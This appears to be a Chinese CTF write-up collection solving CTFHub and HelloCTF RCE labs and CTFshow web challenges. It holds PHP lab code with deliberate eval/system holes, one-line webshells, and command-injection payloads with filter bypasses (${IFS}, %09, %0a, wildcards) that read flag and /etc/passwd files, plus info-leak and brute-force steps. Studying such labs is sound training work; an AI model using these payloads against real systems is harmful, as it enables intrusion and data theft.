# CTFHub-RCE 模块

## eval()执行
```php
 <?php
if (isset($_REQUEST['cmd'])) {
    eval($_REQUEST["cmd"]);
} else {
    highlight_file(__FILE__);
}
?> 
```

> ✨ 没啥过滤的
>

```php
/?cmd=system("ls /");
/?cmd=system("cat /flag_17544");
```

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736913432352-9edbc657-2220-481e-bc30-59df66ecfbeb.png)

## 文件包含
![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736913515373-1e665137-9a58-4816-9a0b-6ccbae812ea7.png)

> 上述代码过滤了 flag
>

点开 shell 得到了一点信息

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736913555987-bef278f1-1ac4-49d6-a2d7-144b30adfd51.png)

> ✨
>
> 使用 shell.txt 的内容是一句话木马
>
> 可以使用 file 传参 shell.txt 产生注入点
>

```php
/?file=shell.txt&ctfhub=system("ls /");
/?file=shell.txt&ctfhub=system("cat /flag");
```

> 也可以用蚁剑连接
>

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736913960316-713cb74b-8da2-4bb5-86ee-c74cc95a1ded.png)

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736914004963-8b19af2f-15af-479f-a0f8-268a8e6ae261.png)

##  php://input
![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736918697555-3d8c07b7-d2ed-49b8-ae0a-a7e06d59e375.png)

> ![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736918749759-7464f4c3-fb7c-48f9-b672-7eb894283e5e.png)
>

在 phpinfo 里可以看到使用条件已经具备

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736918807858-52ff7c36-4d67-40bb-ac81-0b3b20299d09.png)

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736919175189-2f259a7b-dd9c-4fe2-8a2f-70e82c5f1c1f.png)![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736919204782-e14ed755-31be-4589-9ec5-29a24ebc5120.png)

## 读取源代码
![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736919739560-c05c0e2e-4f79-42bc-8599-747bcb75c6d5.png)

> ![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736918749759-7464f4c3-fb7c-48f9-b672-7eb894283e5e.png?x-oss-process=image%2Fformat%2Cwebp)
>

使用 php://filter 读取文件

```php
/?file=php://filter/resource=/flag
```

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736919973171-9d816437-4426-4f54-88aa-4dea7432ae69.png)

## 远程包含
![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736920027838-f49bf204-7f33-4c7c-81b0-503053ff6516.png)

和 php://input 同解

## 命令注入
![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736923914149-dd666dc5-d3bb-496f-a18b-de132c542f21.png)

看到源码

> 多命令执行，直接用分号截断
>

```php
;ls
```

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736925002791-3477ec7e-3cad-486e-a610-ae637e4a3e6e.png)

因为 php 无法直接在网页中显示所以要编码

```php
;ls ;cat 2404596998962.php | base64
```

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736925126058-c6ba71c4-fb7d-4fd7-94a1-f35d2abb46e6.png)

解码

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736925183830-39e0ea4b-82b5-4208-8767-2c4a030e26d6.png)

## 过滤 cat
```php
;ls
;tac flag_57202333513255.php | base64
```

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736925503731-02ba4ca5-2949-433c-a897-60df69cc701e.png)

解码

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736925531890-5ad1440a-4dd3-43d8-818b-96177b90a3cf.png)

## 过滤空格
![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736929430239-d00afe8a-17b3-46f3-ada0-ab41616fd366.png)

```php
;ls
;cat${IFS}flag_320502311823104.php${IFS}|${IFS}base64
```

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736929532336-34e392fe-e4ba-4bbd-a740-b428c1611200.png)

解码

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736929997953-7a0cab5c-94c3-4a24-b99f-1e0139df7758.png)

##  过滤目录分隔符  
> 使用 cd 命令
>

```php
;ls
;cd flag_is_here;ls
;cd flag_is_here;cat flag_87731798816231.php | base64
```

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736929800343-c568cc78-0aa8-4105-9e29-8995bc0f9f4c.png)

解码

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736929822273-eaf1a1bc-64b2-4f19-9df4-c29c76ee0db2.png)

## 过滤运算符
![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736930078528-6718edc5-f172-43f9-a976-bf71f48602b0.png)

> 过滤了 | 和 &
>

```php
;ls
;cat flag_12652570514870.php
//右键看源码即可得到flag
```

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736930641529-a3329b8b-4428-45fb-b08b-5baf95cd542d.png)

## 综合练习
![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736930771508-b3608053-7eaa-4ed5-a829-5f31d0ce6b5c.png)

> 过滤了 |  &  ；空格   /   cat  flag  ctfhub
>

> ;  用  %0a 替代（命令分隔符）
>
> 空格用 %09 替代
>
> flag  用  f* 替代
>

在 url 栏中输入

```php
/?ip=%0Als
/?ip=%0Als%09f*
/?ip=%0Acd%09f*%0Atac%09f*
```

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1737291819291-756c2694-8f01-4de6-a8cf-2befd2134c15.png)

# RCE-labs
## Level 0  代码执行&命令执行  
> flag ，点击就送
>

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1737266652636-70993043-7e02-4fd2-ae56-969296d86133.png)

## Level 1  一句话木马和代码执行  
```php
<?php 
  include ("get_flag.php");
/*
# -*- coding: utf-8 -*-
# @Author: 探姬
# @Date:   2024-08-11 14:34
# @Repo:   github.com/ProbiusOfficial/RCE-labs
# @email:  admin@hello-ctf.com
# @link:   hello-ctf.com

--- HelloCTF - RCE靶场 : 一句话木马和代码执行 --- 

「代码执行(Code Execution)」 在某个语言中，通过一些方式(通常为函数或者方法调用)执行该语言的任意代码的行为，如PHP中的`eval()`函数或Python中的`exec()`函数。

当漏洞入口点可以执行任意代码时，我们称其为代码执行漏洞 —— 这种漏洞包含了通过语言中对接系统命令的函数来执行系统命令的情况，比如 eval("system('cat /etc/passwd')";); 也被归为代码执行漏洞。

我们平时最常见的一句话木马就用的 eval() 函数，如下所示（一般情况下，为了接收更长的Payload，我们一般对可控参数使用POST传参）

try POST:
    a=echo "Hello,World!";
*/

eval($_POST['a']);

highlight_file(__FILE__);

?>
```

> 蚁剑连接
>

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1737266747082-68786e4d-687c-4362-9047-787fc90bc8a6.png)

## Level 2 PHP代码执行函数  
```php
<?php 
include ("get_flag.php");
global $flag;

session_start(); // 开启 session
/*
# -*- coding: utf-8 -*-
# @Author: 探姬
# @Date:   2024-08-11 14:34
# @Repo:   github.com/ProbiusOfficial/RCE-labs
# @email:  admin@hello-ctf.com
# @link:   hello-ctf.com

--- HelloCTF - RCE靶场 : PHP代码执行函数 --- 

除开在一句话木马中最受欢迎用以直接执行PHP代码的 eval() 函数，PHP还有许多 回调函数 也可以直接或者间接的执行PHP代码。

在该关卡中，你将会从能够执行代码的PHP函数中抽取一个，你需要填充函数的内容来执行某些代码以获取flag（tip:flag存储在 $flag 中,当然你也可以尝试其他方法）。


*/
function hello_ctf($function, $content){
  global $flag;
  $code = $function . "(" . $content . ");";
  echo "Your Code: $code <br>";
  eval($code);
}

function get_fun(){

  $func_list = ['eval','assert','call_user_func','create_function','array_map','call_user_func_array','usort','array_filter','array_reduce','preg_replace'];

  if (!isset($_SESSION['random_func'])) {
    $_SESSION['random_func'] = $func_list[array_rand($func_list)];
  }

  $random_func = $_SESSION['random_func'];

  $url_fucn = preg_replace('/_/', '-', $_SESSION['random_func']);

  echo "获得新的函数: $random_func ，去 https://www.php.net/manual/zh/function.".$url_fucn.".php 查看函数详情。<br>";

  return $_SESSION['random_func'];
}

function start($act){

  $random_func = get_fun();

  if($act == "r"){ /* 通过发送GET ?action=r 的方式可以重置当前选中的函数 —— 或者你可以自己想办法可控它x */
                   session_unset();
                   session_destroy(); 
                 }

  if ($act == "submit"){
    $user_content = $_POST['content']; 
    hello_ctf($random_func, $user_content);
  }
}

isset($_GET['action']) ? start($_GET['action']) : '';

highlight_file(__FILE__);

?>
```

> 代码审计
>
> 以下是对上述 PHP 代码的总结：
>
> 1. **文件包含与全局变量**：
>     - `include ("get_flag.php");`：包含了一个名为 `get_flag.php` 的文件。
>     - `global $flag;`：声明 `$flag` 为全局变量，该变量可能存储了需要获取的 `flag`。
> 2. **Session 操作**：
>     - `session_start();`：开启会话，用于存储用户会话信息。
> 3. **核心函数 **`hello_ctf`：
>     - `function hello_ctf($function, $content){...}`：
>         * 接收两个参数 `$function` 和 `$content`。
>         * 构建代码字符串 `$code`，将 `$function` 和 `$content` 拼接成可执行的代码，格式为 `$function($content);`。
>         * 输出构建的代码字符串 `Your Code: $code <br>`。
>         * 使用 `eval($code);` 执行拼接的代码，这里存在代码执行风险，因为 `eval` 会执行传入的字符串作为 PHP 代码。
> 4. **函数 **`get_fun`：
>     - `function get_fun(){...}`：
>         * 定义一个包含多个 PHP 函数名称的数组 `$func_list`，这些函数可能与代码执行相关，例如 `eval`、`assert`、`call_user_func` 等。
>         * 检查会话中是否已经存储了 `random_func`，若没有，则从 `$func_list` 中随机选择一个函数存储到 `$_SESSION['random_func']`。
>         * 获取存储在会话中的函数名称并赋值给 `$random_func`。
>         * 对函数名称进行处理，将下划线 `_` 替换为连字符 `-` 存储在 `$url_fucn` 中。
>         * 输出获取的函数信息，并提供一个链接到 PHP 官方文档查看该函数的详细信息。
>         * 最终返回存储在会话中的函数名称。
> 5. **函数 **`start`：
>     - `function start($act){...}`：
>         * 调用 `get_fun` 函数获取一个随机函数存储在 `$random_func` 中。
>         * 根据传入的 `$act` 参数进行不同操作：
>             + 若 `$act == "r"`，通过 `session_unset();` 和 `session_destroy();` 重置会话，可用于重置当前选中的函数。
>             + 若 `$act == "submit"`，从 `$_POST['content']` 获取用户输入的内容存储在 `$user_content` 中，然后调用 `hello_ctf` 函数，将 `$random_func` 和 `$user_content` 作为参数传递。
> 6. **程序入口**：
>     - `isset($_GET['action'])? start($_GET['action']) : '';`：根据 `GET` 请求的 `action` 参数来调用 `start` 函数，若 `action` 参数不存在，则不执行任何操作。
> 7. **显示代码**：
>     - `highlight_file(__FILE__);`：将当前文件的代码高亮显示，可能用于代码审计或调试。
>

随便输入一下，得到随机的函数 assert（）

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1737287940489-f91579d7-db33-45a8-b632-be32b143ed0f.png)

> 然后 /?action=submit
>
> content=print_r($flag)
>

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1737288174893-2ed5d4ca-eff2-4635-9db0-be9c45820afa.png)

## Level 3 命令执行
```php
<?php 
  /*
# -*- coding: utf-8 -*-
# @Author: 探姬
# @Date:   2024-08-11 14:34
# @Repo:   github.com/ProbiusOfficial/RCE-labs
# @email:  admin@hello-ctf.com
# @link:   hello-ctf.com

--- HelloCTF - RCE靶场 : 命令执行 --- 

「命令执行(Command Execution)」 通常指的是在操作系统层面上执行预定义的指令或脚本。这些命令最终的指向通常是系统命令，如Windows中的CMD命令或Linux中的Shell命令，这在语言中可以体现为一些特定的函数或者方法调用，如PHP中的`shell_exec()`函数或Python中的`os.system()`函数。

当漏洞入口点只能执行系统命令时，我们可以称该漏洞为命令执行漏洞，如下面修改过的 "一句话木马":

try POST:
    a=cat /etc/passwd;

*/

system($_POST['a']);

highlight_file(__FILE__);


?>
```

```php
a=ls /
a=cat /flag
```

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1737288431948-19a393d2-f40f-4a96-b073-4298d680e23d.png)![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1737288454184-59f8a675-4c57-49a7-b3e2-5da36fb0fea1.png)

## Level 4  SHELL 运算符  
```php
 <?php 
/*
# -*- coding: utf-8 -*-
# @Author: 探姬
# @Date:   2024-08-11 14:34
# @Repo:   github.com/ProbiusOfficial/RCE-labs
# @email:  admin@hello-ctf.com
# @link:   hello-ctf.com

--- HelloCTF - RCE靶场 : 命令执行 - SHELL 运算符 --- 

https://www.runoob.com/linux/linux-shell-basic-operators.html

SHELL 运算符 可以用于控制命令的执行流程，使得你能够根据条件执行不同的命令。

&&（逻辑与运算符）: 只有当第一个命令 cmd_1 执行成功（返回值为 0）时，才会执行第二个命令 cmd_2。例:  mkdir test && cd test

||（逻辑或运算符）: 只有当第一个命令 cmd_1 执行失败（返回值不为 0）时，才会执行第二个命令 cmd_2。例:  cd nonexistent_directory || echo "Directory not found"

&（后台运行符）: 将命令 cmd_1 放到后台执行，Shell 立即执行 cmd_2，两个命令并行执行。例:  sleep 10 & echo "This will run immediately."

;（命令分隔符）: 无论前一个命令 cmd_1 是否成功，都会执行下一个命令 cmd_2。例:  echo "Hello" ; echo "World"


try GET:
    ?ip=8.8.8.8
flag is /flag
*/

function hello_server($ip){
    system("ping -c 1 $ip");
}

isset($_GET['ip']) ? hello_server($_GET['ip']) : null;

highlight_file(__FILE__);


?>

```

分割一下 ping 命令就行

```php
/?ip=;ls /
/?ip=;cat /flag
```

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1737288604656-4c688163-5288-4c86-bdd0-996df1be83f8.png)

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1737288644341-58a7426f-ab03-4329-a861-b22fc922be00.png)

## Level 5  黑名单式过滤  
```php
 <?php 
/*
# -*- coding: utf-8 -*-
# @Author: 探姬
# @Date:   2024-08-11 14:34
# @Repo:   github.com/ProbiusOfficial/RCE-labs
# @email:  admin@hello-ctf.com
# @link:   hello-ctf.com

--- HelloCTF - RCE靶场 : 命令执行 - 终端特性_空字符忽略和通配符 --- 

在Shell中，单/双引号 "/' 可以用来定义一个空字符串或保护包含空格或特殊字符的字符串。
例如：echo "$"a 会输出 $a，而 echo $a 会输出变量a的值，当只有""则表示空字符串，Shell会忽略它。

*（星号）: 匹配零个或多个字符。例子: *.txt。
?（问号）: 匹配单个字符。例子: file?.txt。
[]（方括号）: 匹配方括号内的任意一个字符。例子: file[1-3].txt。
[^]（取反方括号）: 匹配不在方括号内的字符。例子: file[^a-c].txt。
{}（大括号）: 匹配大括号内的任意一个字符串。例子: file{1,2,3}.txt。

通过组合上述技巧，我们可以用于绕过CTF中一些简单的过滤：

system("c''at /e't'c/pass?d");
system("/???/?at /e't'c/pass?d");
system("/???/?at /e't'c/*ss*");
...


*/

function hello_shell($cmd){
    if(preg_match("/flag/", $cmd)){
        die("WAF!");
    }
    system($cmd);
}

isset($_GET['cmd']) ? hello_shell($_GET['cmd']) : null;

highlight_file(__FILE__);


?>

```

```php
/?cmd=ls /
/?cmd=cat /fla?
```

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1737289103357-41b2076c-374a-44b8-aef1-344dbf232ae3.png)![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1737289138644-593bfeef-abee-4cd7-b5a1-0efc55442384.png)

## Level 6  通配符匹配绕过  
```php
 <?php 
/*
# -*- coding: utf-8 -*-
# @Author: 探姬
# @Date:   2024-08-11 14:34
# @Repo:   github.com/ProbiusOfficial/RCE-labs
# @email:  admin@hello-ctf.com
# @link:   hello-ctf.com

--- HelloCTF - RCE靶场 : 挑战关 --- 

刚才，学了什么来着！？

*/

function hello_shell($cmd){
    if(preg_match("/[b-zA-Z_@#%^&*:{}\-\+<>\"|`;\[\]]/", $cmd)){
        die("WAF!");
    }
    system($cmd);
}

isset($_GET['cmd']) ? hello_shell($_GET['cmd']) : null;

highlight_file(__FILE__);


?>
```

> 禁用了小写 b 到 z，大写 A 到 Z，_  @  # % ^  &  *  :  {  }  -  +  <  >  "  |   '  ;  [  ]  
>

注意没有禁用小写 a

猜测 flag 在根目录下

同时了 linux 命令都放在 bin 目录下

可以构造

> /bin/cat  /flag
>
> /bin/base64 /flag
>

模糊匹配一下，如下

```php
/?cmd=/???/?a? /??a?
/?cmd=/???/?a??64 /??a?
```

会匹配到很多东西，搜索一下就好了

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1737289864293-5276f36b-e432-45e3-9069-077938dbe31d.png)

## Level 7  空格过滤  
```php
 <?php 
/*
# -*- coding: utf-8 -*-
# @Author: 探姬
# @Date:   2024-08-11 14:34
# @Repo:   github.com/ProbiusOfficial/RCE-labs
# @email:  admin@hello-ctf.com
# @link:   hello-ctf.com

--- HelloCTF - RCE靶场 : 命令执行 - 终端特殊字符 --- 

在遇到空格被过滤的情况下，通常使用 %09 也就是TAB的URL编码来绕过，在终端环境下 空格 被视为一个命令分隔符，本质上由 $IFS 变量控制，而 $IFS 的默认值是空格、制表符和换行符，所以我们还可以通过直接键入 $IFS 来绕过空格过滤。


*/

function hello_shell($cmd){
    if(preg_match("/flag| /", $cmd)){
        die("WAF!");
    }
    system($cmd);
}

isset($_GET['cmd']) ? hello_shell($_GET['cmd']) : null;

highlight_file(__FILE__);


?>

```

> 过滤了空格和 flag
>

```php
/?cmd=ls /
cat$IFS/fla*
```

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1737290327284-4b3adb0b-ba59-4eb8-acdc-bccc4f4c31f9.png)

## Level 8  文件描述和重定向
```php
 <?php 
/*
# -*- coding: utf-8 -*-
# @Author: 探姬
# @Date:   2024-08-11 14:34
# @Repo:   github.com/ProbiusOfficial/RCE-labs
# @email:  admin@hello-ctf.com
# @link:   hello-ctf.com

--- HelloCTF - RCE靶场 : 命令执行 - 重定向 --- 

大多数 UNIX 系统命令从你的终端接受输入并将所产生的输出发送回​​到您的终端。一个命令通常从一个叫标准输入的地方读取输入，默认情况下，这恰好是你的终端。同样，一个命令通常将其输出写入到标准输出，默认情况下，这也是你的终端 —— 这些是命令有回显的基础。

如果希望执行某个命令，但又不希望在屏幕上显示输出结果，那么可以将输出重定向到 /dev/null：
$ command > /dev/null

/dev/null 是一个特殊的文件，写入到它的内容都会被丢弃；如果尝试从该文件读取内容，那么什么也读不到。但是 /dev/null 文件非常有用，将命令的输出重定向到它，会起到"禁止输出"的效果。
如果希望屏蔽 stdout 和 stderr，可以这样写：
$ command > /dev/null 2>&1

*/

function hello_shell($cmd){
    /*>/dev/null 将不会有任何回显，但会回显错误，加上 2>&1 后连错误也会被屏蔽掉*/
    system($cmd.">/dev/null 2>&1");
}

isset($_GET['cmd']) ? hello_shell($_GET['cmd']) : null;

highlight_file(__FILE__);


?>

```

> 使用  ； 分割命令
>
> 或者使用 || 逻辑符短路后面的命令
>

```php
/?cmd=ls /||
/?cmd=cat /flag||
```

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1737290597153-ae60da10-635c-46d0-9ff4-69483bc169b1.png)

# CTFshow

## web1

> hint：开发注释未及时删除

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736401477801-7344cc3c-f6e0-4f2c-a86c-332d60b1e768.png)

## web2

> hint：js前台拦截 === 无效操作

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736401579382-35edb958-a49d-4b4e-957b-3e1f584b0065.png)

禁用了 F12 和 右键

**解决办法**

> 1、ctrl+u 看源码
>
> 2、url 前面加上 view-source: 看源码
>
> 3、ctrl+shift+i 打开开发者工具
>
> 4、在浏览器设置，更多工具中找到开发者工具

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736401727430-a4c6a26b-f5d2-43ac-9553-8dbf4722d01b.png)

## web3

**提示：**

> hint：没思路的时候抓个包看看，可能会有意外收获

看看请求头

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736401876752-47d83c7c-ad94-4234-8f15-0285a05d651d.png)

## web4

> hint：总有人把后台地址写入robots，帮黑阔大佬们引路。

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736402011129-870b2da4-0623-4510-9dad-19963c34378d.png)

跳转![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736402033387-93df624f-827e-4098-9338-85af69547b15.png)

## web5

> hint：phps源码泄露有时候能帮上忙

url 后加上 /index.phps ，会下载文件。

打开如下![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736402302167-267ef2e7-0e29-462f-97d8-cc77f08989bc.png)

### 总结

`phps文件就是php的源代码文件，通常用于提供给用户（访问者）查看php代码，因为用户无法直接通过Web浏览器看到php文件的内容，所以需要用phps文件代替。其实，只要不用php等已经在服务器中注册过的MIME类型为文件即可，但为了国际通用，所以才用了phps文件类型。`

## web6

> hint：解压源码到当前目录，测试正常，收工

猜测后台有压缩包，使用 dirsearch 扫目录

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736402771123-b347c01f-a28f-4ae6-a1a4-72814288864c.png)

跳转并解压缩

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736402817049-d5846601-c9e3-4b36-b5ca-aadf69ac4093.png)

打开

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736402806570-05c22860-3f27-4fba-b957-6ce2511bddaf.png)

## web7

> hint:版本控制很重要，但不要部署到生产环境更重要。

猜测为 git 泄露，扫目录

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736403063896-b7abd4e5-0b54-402d-98f6-f027c31db328.png)

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736403052612-eeb414fd-1b34-4856-9d5d-0a463e77479c.png)

## web8

> hint：版本控制很重要，但不要部署到生产环境更重要。

接着扫

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736403219381-11284f28-f6a6-4644-a6a2-da4a359e82fc.png)

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736403205961-30eb5cf4-13aa-4f8a-8eb1-337d689cd2e9.png)

## web9

> hint：发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了

url 后加上 /index.php.swp 会下载文件

打开文件

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736403452308-6790146f-3fd2-461f-b9ff-097de7fc79a5.png)

### 总结

 **关于swp文件 **

 使用vi，经常可以看到swp这个文件,那这个文件是怎么产生的呢，当你打开一个文件，vi就会生成这么一个.(filename)swp文件 以备不测（不测下面讨论），如果你正常退出，那么这个这个swp文件将会自动删除 。

下面说不自动删除的情况。 

+ 1、当你用多个程序编辑同一个文件时。 
+ 2、非常规退出时。

可以在 linux 里使用如下命令恢复 swp 文件

```javascript
vi -r 文件路径
```

## web10

> hint：cookie 只是一块饼干，不能存放任何隐私数据

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736403546283-e573d451-2243-4b62-8267-91dd77628a50.png)

url 解码一下

```plain
ctfshow{c3e9d906-4bfd-48c5-8d3c-ea45ad1e3970}
```

## web11

> hint：域名其实也可以隐藏信息，比如flag.ctfshow.com 就隐藏了一条信息‘

对域名进行 DNS 解析

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736404201406-0209b1e3-0dad-4a14-a114-db405c04d84e.png)

## web12

> hint： 有时候网站上的公开信息，就是管理员常用密码

可疑信息

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736404457448-832ef382-726d-4ff0-abc9-1612660ff69a.png)

进入 /robots.txt

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736404523880-f8d01b36-652e-4303-9620-66aac926e638.png)

得到账号密码

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736404597475-9ad05462-fed9-4845-b73c-cdf172872d20.png)

## web13

> hint：技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码

寻找技术文档

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736404775352-b01bd995-6dc2-410a-8143-5b3d802e8e7e.png)

点击后会下载 pdf 文件，打开

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736404803179-e15e34ce-7868-4773-9d37-5694b9b26c0a.png)

url 后加入 /system1103/login.php 登录

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736404935720-0a9d6b64-4fc5-4dbf-b0b5-b7835c870098.png)

## web14

> hint：有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人

ctrl+u 查看源码，搜索 editor

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736412944535-2d55e356-fc75-4132-aaec-f2ce9954e447.png)

发现这个，尝试进入![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736413112488-b33a7904-5105-4465-b226-d15d8437a0fc.png)

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736413133810-bbde872c-f38c-47d3-a3f5-60a83faf5ad7.png)

在 var/www/html/nothinghere 里找到 fl000g.txt  文件

 因此我们需要访问URL/nothinghere/fl000g.txt即可

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736420196300-92ddbb3d-33ff-4a4c-b375-8b2e303fc1fd.png)

## web15

> hint：公开的信息比如邮箱，可能造成信息泄露，产生严重后果

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736420485084-dbacb9dc-09b7-4d0e-b250-6a2bf60ff8d3.png)

扫后台

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736420917268-17dad810-36b6-4534-bddb-5610676d0ff6.png)

进入 /admin，选忘记密码

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736420800809-edffe937-bfe7-465c-b2f5-bc183e51761c.png)

搜索邮箱中的 qq 号，发现在西安。重置密码之后猜测用户名为 admin

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736421015182-252ec992-07b0-4890-ac27-fdafa234b1a2.png)

## web16

> hint：对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露

扫目录啥也没扫出来，查资料要用 tz.php

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736421432765-53548d61-7719-4c3d-ba3c-2998fc07c843.png)

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736421461978-ff609bea-6510-4bb0-a92e-7356557eb348.png)

## web17

> hint： 备份的sql文件会泄露敏感信息

扫后台

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736421601436-ed608360-4f22-4a2c-892d-b1597ea360dc.png)

下载后打开

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736421663176-ff421253-0cd9-4634-8656-0129025376f3.png)

## web18

> hint：不要着急，休息，休息一会儿，玩101分给你flag

游戏题，查找关键代码

```plain
if(game_over==false)
{
requestAnimationFrame(run);
}else
{
if(score>100)
{
var result=window.confirm("\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b");
}
else
{
var result=window.confirm("GAMEOVER\n是否从新开始");
if(result){
location.reload();}
}
```

令 game_over = false 且 score > 100 才行

控制台输入

```plain
game_over=false;score=200;run();
```

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736422231071-0226b4db-d9c6-4780-bad6-14af211126ec.png)

进入 110.php

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736422267793-2b9b545f-465b-4cd8-8b61-7cb340b2f9ba.png)

## web19

> hint：密钥什么的，就不要放在前端了

查看源码

```javascript
<script type="text/javascript">
  function checkForm(){
    var key = "0000000372619038";
    var iv = "ilove36dverymuch";
    var pazzword = $("#pazzword").val();
    pazzword = encrypt(pazzword,key,iv);
    $("#pazzword").val(pazzword);
    $("#loginForm").submit();

  }
function encrypt(data,key,iv) { //key,iv：16位的字符串
  var key1  = CryptoJS.enc.Latin1.parse(key);
  var iv1   = CryptoJS.enc.Latin1.parse(iv);
  return CryptoJS.AES.encrypt(data, key1,{
    iv : iv1,
    mode : CryptoJS.mode.CBC,
    padding : CryptoJS.pad.ZeroPadding
  }).toString();
}

</script>
  <!--
  error_reporting(0);
$flag="fakeflag"
$u = $_POST['username'];
$p = $_POST['pazzword'];
if(isset($u) && isset($p)){
  if($u==='admin' && $p ==='a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04'){
    echo $flag;
  }
}
-->
```

AES 加密

> mode模式： CBC padding填充方式： ZeroPadding  
> 密文输出编码： 十六进制hex 偏移量iv: ilove36dverymuch 密钥：0000000372619038  
> 密文为： a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04  

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736422728722-d9468331-c8ac-4116-95d1-ece18376eac1.png)

得到密码为 `i_want_a_36d_girl`

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736422761287-875abd05-f4f9-4fa9-bc7a-30ab9c9e5d1c.png)

## web20

> hint：mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。

使用 dirsearch 递归扫描

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736423254122-f21844bb-4cfa-4e2f-961a-56321387252d.png)

下载后搜索 flag

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736423392705-a6735ff2-d9cc-49fd-8740-6c4cbae9c2e6.png)

## web21

> hint：爆破什么的，都是基操

随便输入一下，直接抓包

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736507195608-172dac8b-4a98-442b-a391-16f4207d5526.png)

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736507321534-12ddbd51-e2ac-4c5b-ae07-c4c4a2bf4566.png)

解码后看到是 账户：密码 的形式

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736507268169-b3d7b270-d53e-4504-b3f2-493ca4c85285.png)

使用给的字典进行爆破

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736507740662-f00438ea-ae43-43da-bd52-a4bb3384587e.png)

得到结果

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736507779374-88020189-f876-4f2d-82ff-f184d697b527.png)

## web22

